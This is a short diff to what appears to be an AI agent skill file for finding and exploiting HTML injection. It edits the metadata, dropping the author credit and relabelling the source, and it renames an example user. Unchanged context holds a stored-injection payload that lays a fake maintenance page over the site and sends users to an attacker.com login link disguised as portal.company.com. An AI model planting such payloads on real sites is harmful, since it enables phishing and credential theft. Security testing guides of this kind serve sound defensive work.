@@ -2,8 +2,7 @@
 name: html-injection-testing
 description: "Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms."
 risk: unknown
-source: community
-author: zebbern
+source: builtin
 date_added: "2026-02-27"
 ---
 
@@ -143,7 +142,7 @@ Payload persists in database:
 
 ```html
 <!-- Profile bio injection -->
-Name: John Doe
+Name: trio-dev
 Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
      <h1>Site Under Maintenance</h1>
      <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
